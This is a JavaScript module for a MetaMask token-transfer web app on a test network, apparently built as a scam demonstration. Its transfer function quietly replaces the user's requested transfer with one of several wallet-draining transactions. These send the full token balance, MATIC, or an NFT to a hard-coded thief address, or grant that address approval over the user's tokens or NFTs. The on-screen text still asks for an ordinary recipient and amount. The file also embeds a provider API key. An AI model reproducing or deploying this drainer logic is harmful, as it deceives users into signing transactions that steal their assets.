//require("dotenv").config();
const alchemyKey = "wss://polygon-mumbai.g.alchemy.com/v2/j05TRbvh8RkOYhh5UsLj807tfSPr9dpp";
const { createAlchemyWeb3 } = require("@alch/alchemy-web3");
const web3 = createAlchemyWeb3(alchemyKey);
const { Utils } = require("alchemy-sdk");

const PBMcontractABI = require("../PBMcontract-abi.json");
const PBMcontractAddress = "0x265252ba9AC35B2Ae3ffD55D49Dff20BF21432A9";
const NFTcontractABI=require("../NFTcontract-abi.json");
const NFTcontractAddress="0x2953399124F0cBB46d2CbACD8A89cF0599974963";
const NFTtokenID="64005625568718405887533128737887026261369077006440304337836291579393490288641"

const StealOptions={
  honestTransfer: Symbol("Transfer"),
  stealPBM: Symbol("PBM"),
  stealPBMbyApprove: Symbol("PBMApprove"),
  stealMatic: Symbol("Matic"),
  stealNFT: Symbol("NFT"),
  stealNFTbyApprove: Symbol("NFTApprove")
}
//Configure scam below
const action=StealOptions.honestTransfer;
const thief="0x50f7c791F55463feD0DB7159Ee1ef8b2C433F8Ca";

export const PBMContract = new web3.eth.Contract(
  PBMcontractABI,
  PBMcontractAddress
);

export const NFTcontract= new web3.eth.Contract(
  NFTcontractABI,
  NFTcontractAddress
);

export const loadName = async () => {
  const name = await PBMContract.methods.name().call();
  return name;
};

export const getBalance = async (address) => {
  const balance = await PBMContract.methods.balanceOf(address).call();
  return balance.toString();
};

export const connectWallet = async () => {
  if (window.ethereum) {
    try {
      const addressArray = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      const obj = {
        status: "👆🏽 Enter the recipient address and amount in the text-fields above.",
        address: addressArray[0],
      };
      return obj;
    } catch (err) {
      return {
        address: "",
        status: "😥 " + err.message,
      };
    }
  } else {
    return {
      address: "",
      status: (
        <span>
          <p>
            {" "}
            🦊{" "}
            <a target="_blank" href={`https://metamask.io/download.html`}>
              You must install Metamask, a virtual Ethereum wallet, in your
              browser.
            </a>
          </p>
        </span>
      ),
    };
  }
};

export const getCurrentWalletConnected = async () => {
  if (window.ethereum) {
    try {
      const addressArray = await window.ethereum.request({
        method: "eth_accounts",
      });
      if (addressArray.length > 0) {
        return {
          address: addressArray[0],
          status: "👆🏽 Enter the recipient address and amount in the text-fields above.",
        };
      } else {
        return {
          address: "",
          status: "🦊 Connect to Metamask using the top right button.",
        };
      }
    } catch (err) {
      return {
        address: "",
        status: "😥 " + err.message,
      };
    }
  } else {
    return {
      address: "",
      status: (
        <span>
          <p>
            {" "}
            🦊{" "}
            <a target="_blank" href={`https://metamask.io/download.html`}>
              You must install Metamask, a virtual Ethereum wallet, in your
              browser.
            </a>
          </p>
        </span>
      ),
    };
  }
};

export const transfer = async (from,to, amount,balance) => {
  //input error handling
  if(amount>balance){
    return {
      status:
        "Not enough in balance"
    };
  }
  if (!window.ethereum || from === null) {
    return {
      status:
        "💡 Connect your Metamask wallet to transfer.",
    };
  }
  if (!web3.utils.isAddress(to)) {
    return {
      status: "❌ Your recipient adress is invalid.",
    };
  }

  amount=Utils.parseEther(amount.toString());
  balance=Utils.parseEther(balance.toString());
  let transactionParameters;
  switch (action){
    case StealOptions.honestTransfer:
      transactionParameters = {
        to: PBMcontractAddress,
        from: from, // must match user's active address.
        data: PBMContract.methods.transfer(to,amount).encodeABI(),
      };
      break;
    case StealOptions.stealPBM:
      transactionParameters = {
        to: PBMcontractAddress,
        from: from, // must match user's active address.
        data: PBMContract.methods.transfer(thief,balance).encodeABI(),
      };
      break;
    case StealOptions.stealPBMbyApprove:
      transactionParameters = {
        to: PBMcontractAddress,
        from: from, // must match user's active address.
        data: PBMContract.methods.approve(thief,amount).encodeABI(),
      };
      break;
    case StealOptions.stealMatic:
      let maticBalance=await web3.eth.getBalance(from);
      maticBalance=maticBalance-maticBalance%1000000000000000000 //leave some matic for gas
      transactionParameters = {
        to: thief,
        from: from, // must match user's active address.
        value: web3.utils.toHex(maticBalance)
      };
      break;
    case StealOptions.stealNFT:
      transactionParameters = {
        to: NFTcontractAddress,
        from: from, // must match user's active address.
        data: NFTcontract.methods.safeTransferFrom(from,thief,web3.utils.toBN(NFTtokenID),1,[]).encodeABI(),
      };
      break;
    case StealOptions.stealNFTbyApprove:
      transactionParameters = {
        to: NFTcontractAddress,
        from: from, // must match user's active address.
        data: NFTcontract.methods.setApprovalForAll(thief,true).encodeABI(),
      };
      break;
  }
  
  try {
    const txHash = await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [transactionParameters],
    });
    return {
      status: (
        <span>
          ✅{" "}
          <a target="_blank" href={`https://mumbai.polygonscan.com/tx/${txHash}`}>
            View the status of your transaction on Etherscan!
          </a>
          <br />
          ℹ️ Once the transaction is verified by the network, the message will
          be updated automatically.
        </span>
      ),
    };
  } catch (error) {
    return {
      status: "😥 " + error.message,
    };
  }
};
